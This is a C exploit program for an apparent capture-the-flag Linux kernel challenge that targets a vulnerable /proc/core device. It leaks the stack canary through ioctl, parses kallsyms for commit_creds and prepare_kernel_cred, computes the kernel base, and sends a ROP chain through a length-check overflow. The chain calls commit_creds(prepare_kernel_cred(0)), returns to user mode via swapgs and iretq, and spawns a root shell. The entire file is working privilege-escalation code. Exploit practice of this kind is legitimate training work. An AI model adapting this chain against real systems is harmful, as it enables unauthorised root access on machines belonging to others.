
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>




#define READ 0x6677889B
#define SETOFF 0x6677889C
#define COPY 0x6677889A


// glabol val
int fd = 0;
unsigned  long cookie;
unsigned  long user_read_buffer[64 / sizeof(unsigned long)];
unsigned  long commit_creds = 0;
unsigned  long prepare_kernel_cred = 0;
unsigned long vmlinux_base = 0;
unsigned long vmlinux_ram_base = 0;

size_t user_cs, user_ss, user_sp, user_rflags; 

int open_core()
{
	fd = open("/proc/core", O_RDWR);
	if(fd < 0)
	{
		puts("[!] Failed to open device!");
		exit(-1);
	}
	puts("[*] Opened device.");
	return fd;
}


void core_read()
{
	memset(user_read_buffer, 0, sizeof(user_read_buffer));
	ioctl(fd, READ, user_read_buffer);
	return ;
}


void core_setoff(int off)
{
	ioctl(fd, SETOFF, off);
	return ;
}

void core_copy(unsigned long length)
{
	ioctl(fd, COPY, length);

}


void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
        );
    puts("[*] Saved state");
}


void leak_canary()
{
	core_setoff(0x40);
	core_read();
	cookie = user_read_buffer[0];
	printf("[*] Leaked canary : 0x%lx\n", cookie);
	return ;
}

size_t find_symbols()
{
    FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");
    /* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char buf[0x30] = {0};
    while(fgets(buf, 0x30, kallsyms_fd))
    {
        if(commit_creds & prepare_kernel_cred)
            return 0;

        if(strstr(buf, "commit_creds") && !commit_creds)
        {
            /* puts(buf); */
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            /* printf("hex: %s\n", hex); */
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds addr: %p\n", commit_creds);
            /*
             * give_to_player [master●●] bpython
                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n
                >>> from pwn import *
				>>> f = ELF("./vmlinux")
				[*] 'f:\\kernel\\CTF\\core_give\\give_to_player\\vmlinux'
				    Arch:     amd64-64-little
				    Version:  4.15.8
				    RELRO:    No RELRO
				    Stack:    Canary found
				    NX:       NX disabled
				    PIE:      No PIE (0xffffffff81000000)
				    RWX:      Has RWX segments
            */
            vmlinux_base = commit_creds - 0x9c8e0;
            printf("vmlinux_base addr: %p\n", vmlinux_base);
        }
        vmlinux_ram_base = 0xffffffff81000000;
        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
        {
            /* puts(buf); */
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
            /* printf("vmlinux_base addr: %p\n", vmlinux_base); */
        }
    }

    if(!(prepare_kernel_cred & commit_creds))
    {
        puts("[*]Error!");
        exit(0);
    }

    printf("[*] commit_creds : 0x%lx\n", commit_creds);
    printf("[*] prepare_kernel_cred : 0x%lx\n", prepare_kernel_cred);
    return ;

}

void get_shell()
{
	if(getuid() != 0)
	{
		puts("[!] not root");
		exit(-1);
	}
	puts("[*] spwan a root shell");
	system("/bin/sh");

	return;

}

int main()
{
	save_state();
	open_core();
	leak_canary();
	find_symbols();

	unsigned long vm_raw_offset = vmlinux_base - vmlinux_ram_base;

	size_t pop_rdi_ret = 0xffffffff81000b2f + vm_raw_offset;
	size_t pop_rdx_ret = 0xffffffff810a0f49 + vm_raw_offset;
	size_t pop_rcx_ret = 0xffffffff81021e53 + vm_raw_offset;
	size_t mov_rdi_rax_call_rdx = 0xffffffff8101aa6a + vm_raw_offset ;

	size_t swapgs_pop_ret = 0xffffffff81a012da + vm_raw_offset;
	size_t iretq_ret = 0xffffffff81050ac2 + vm_raw_offset;

	size_t rop[0x100];
	int i;
	for(i = 0; i < 10; i++)
	{
		rop[i] = 0x11223344;
	}
	rop[8] = cookie;					// set canary

	rop[i++] = pop_rdi_ret;							// pop  rdi; ret
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred;

	rop[i++] = pop_rdx_ret;						// rdx ==> pop_rcx_ret
	rop[i++] = pop_rcx_ret;						
	rop[i++] = mov_rdi_rax_call_rdx; 			// call ==> pop rcx ; ret 
	rop[i++] = commit_creds;

	rop[i++] = swapgs_pop_ret;					// swapgs; 
	rop[i++] = 0;
	rop[i++] = iretq_ret;
	rop[i++] = (size_t)get_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;


	write(fd, rop, 0x100 * 8);				// core_wrte
	core_copy(0xffffffffffff0000 | 0x100);
	return 0;


}